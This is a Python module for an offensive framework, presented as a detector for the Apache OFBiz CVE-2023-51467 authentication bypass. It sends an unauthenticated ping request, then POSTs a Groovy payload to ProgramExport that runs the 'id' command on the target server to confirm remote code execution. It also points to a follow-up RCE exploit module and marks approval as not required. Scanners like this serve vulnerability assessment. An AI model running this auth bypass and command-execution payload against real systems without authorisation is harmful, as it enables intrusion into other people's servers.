#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Apache OFBiz CVE-2023-51467 authentication bypass detection."""

import re

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Apache OFBiz CVE-2023-51467 Auth Bypass Detection',
        'description': (
            'Detects CVE-2023-51467 by accessing /webtools/control/ping with empty '
            'credentials and requirePasswordChange=Y, then confirming Groovy execution '
            'via ProgramExport.'
        ),
        'author': ['KittySploit Team'],
        'severity': 'critical',
        'tags': [
            'web', 'scanner', 'cve', 'cve2023', 'ofbiz', 'apache', 'groovy',
            'auth-bypass', 'rce', 'kev', 'vuln',
        ],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 2,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.5,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {'capability': 'admin_surface', 'from_detail': 'ProgramExport Groovy'},
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [
                    'exploits/multi/http/apache_ofbiz_cve_2023_51467_rce',
                ],
            },
        },
        'references': [
            'https://nvd.nist.gov/vuln/detail/CVE-2023-51467',
            'https://ofbiz.apache.org/security.html',
        ],
        'cve': 'CVE-2023-51467',
    }

    port = OptPort(8443, 'OFBiz HTTPS port', True)
    ssl = OptBool(True, 'Use HTTPS', True, advanced=True)

    def run(self):
        ping_path = (
            '/webtools/control/ping?USERNAME=&PASSWORD=&requirePasswordChange=Y'
        )
        r = self.http_request(method='GET', path=ping_path, allow_redirects=True)
        if not r or int(r.status_code or 0) not in (200, 500):
            return False
        body = (r.text or '').lower()
        if 'login' in body and 'ping' not in body:
            return False

        export_path = (
            '/webtools/control/ProgramExport?USERNAME=&PASSWORD=&requirePasswordChange=Y'
        )
        groovy = "throw new Exception('id'.execute().text);"
        r2 = self.http_request(
            method='POST',
            path=export_path,
            data={'groovyProgram': groovy},
            headers={'Content-Type': 'application/x-www-form-urlencoded'},
            allow_redirects=True,
        )
        if not r2:
            return False
        resp = r2.text or ''
        if re.search(r'uid=\d+', resp):
            self.set_info(
                severity='critical',
                reason='Apache OFBiz CVE-2023-51467 auth bypass + Groovy RCE confirmed',
                path=export_path,
                evidence='uid= in ProgramExport response',
            )
            return True
        if 'requirepasswordchange' in body or 'ping' in body:
            self.set_info(
                severity='high',
                reason='Apache OFBiz CVE-2023-51467 auth bypass reachable',
                path=ping_path,
            )
            return True
        return False
